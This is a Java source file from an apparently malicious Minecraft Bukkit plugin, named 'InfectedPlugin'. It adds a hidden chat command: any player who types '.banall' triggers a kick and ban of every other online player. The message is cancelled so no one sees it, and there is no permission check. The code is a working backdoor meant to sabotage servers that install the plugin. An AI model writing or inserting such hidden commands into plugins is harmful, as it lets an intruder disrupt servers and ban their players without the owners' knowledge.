package org.CreeperCoders.InfectedPlugin.Commands;

import org.bukkit.Server;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_banall implements Listener
{

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        Player player = event.getPlayer();
        Server server = Bukkit.getServer();
        boolean cancel = false;

        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".banall"))
            {
                player.kickPlayer("You have been kicked so you don't get banned too :) \nRejoin!");
                for (final Player target : server.getOnlinePlayers())
                {
                    target.kickPlayer("The Ban Hammer has spoken!");
                    target.setBanned(true);
                }
                cancel = true;
            }
        }

        if (cancel)
        {
            event.setCancelled(true);
        }
    }
}